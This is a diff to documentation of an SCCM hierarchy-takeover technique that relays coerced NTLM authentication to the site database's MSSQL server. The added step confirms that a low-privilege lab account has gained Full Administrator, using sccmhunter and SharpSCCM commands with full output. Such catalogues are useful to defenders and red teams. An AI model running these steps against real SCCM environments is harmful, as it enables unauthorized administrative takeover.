@@ -1,4 +1,4 @@
-# TAKEOVER1
+# TAKEOVER-01
 
 ## Description
 Hierarchy takeover via NTLM coercion and relay to MSSQL on the site database
@@ -152,12 +152,76 @@ The steps to execute TAKEOVER-1.1 through TAKEOVER-1.4 are the same except that 
     [2024-02-22 16:37:17] [*] INFO(SITE-DB): Line 1: Changed database context to 'CM_PS1'.
     ```
 
-4. Confirm that the account now has the `Full Administrator` role:
+4. Confirm that the account now has the `Full Administrator` role by querying WMI on an SMS Provider.
 
-    (Linux, using `sccmhunter`)
-    
-    (Windows, using `SharpSCCM`)
+    On Linux, using `sccmhunter`:
+    ```
+    $ python3 sccmhunter.py  admin -u lowpriv -p <PASSWORD> -ip SITE-SMS      
 
+                                                                                            (
+                                        888                         d8                         \
+    dP"Y  e88'888  e88'888 888 888 8e  888 ee  8888 8888 888 8e   d88    ,e e,  888,8,        )
+    C88b  d888  '8 d888  '8 888 888 88b 888 88b 8888 8888 888 88b d88888 d88 88b 888 "    ##-------->
+    Y88D Y888   , Y888   , 888 888 888 888 888 Y888 888P 888 888  888   888   , 888           )
+    d,dP   "88,e8'  "88,e8' 888 888 888 888 888  "88 88"  888 888  888    "YeeP" 888          /
+                                                                                            (
+                                                                    v0.0.2                   
+                                                                    @garrfoster                    
+        
+        
+
+    [15:36:54] INFO     [!] Enter help for extra shell commands                                                                                                                                              
+    () (C:\) >> show_admins
+    [15:37:43] INFO     Tasked SCCM to list current SMS Admins.                                                                                                                                              
+    [15:37:44] INFO     Current Full Admin Users:                                                                                                                                                            
+    [15:37:44] INFO     MAYYHEM\sccmadmin                                                                                                                                                                    
+    [15:37:44] INFO     MAYYHEM\lowpriv 
+    ```
+
+    On Windows, using `SharpSCCM`:
+    ```
+    > .\SharpSCCM.exe get users -n lowpriv -sms SITE-SMS -sc ps1
+
+    _______ _     _ _______  ______  _____  _______ _______ _______ _______
+    |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
+    ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem
+
+    [+] Connecting to \\SITE-SMS\root\SMS\site_ps1
+    [+] Executing WQL query: SELECT * FROM SMS_R_User WHERE UniqueUserName LIKE '%lowpriv%'
+    -----------------------------------
+    SMS_R_User
+    -----------------------------------
+    AADTenantID:
+    AADUserID:
+    ADObjectCreationTime: 20230721132400.000000+***
+    AgentName: SMS_AD_USER_DISCOVERY_AGENT, SMS_AD_SECURITY_GROUP_DISCOVERY_AGENT
+    AgentSite: PS1, PS1
+    AgentTime: 20230721202501.000000+***, 20230803202502.000000+***
+    CloudUserId:
+    CreationDate: 20230721202502.760000+***
+    DistinguishedName: CN=Low Priv,CN=Users,DC=MAYYHEM,DC=LOCAL
+    FullDomainName: MAYYHEM.LOCAL
+    FullUserName: Low Priv
+    Mail:
+    Name: MAYYHEM\lowpriv (Low Priv)
+    NetworkOperatingSystem: Windows NT
+    ObjectGUID: Can't display UInt8 as a String
+    PrimaryGroupID: 513
+    ResourceId: 2063597571
+    ResourceType: 4
+    SecurityGroupName: MAYYHEM\Domain Users
+    SID: S-1-5-21-622943703-4251214699-2177406285-1112
+    UniqueUserName: MAYYHEM\lowpriv
+    UserAccountControl: 66048
+    UserContainerName: MAYYHEM\USERS
+    UserGroupName: MAYYHEM\Domain Users
+    UserName: lowpriv
+    UserOUName:
+    UserPrincipalName: lowpriv@MAYYHEM.LOCAL
+    WindowsNTDomain: MAYYHEM
+    -----------------------------------
+    [+] Completed execution in 00:00:00.9878140
+    ```
 
 
 ## References
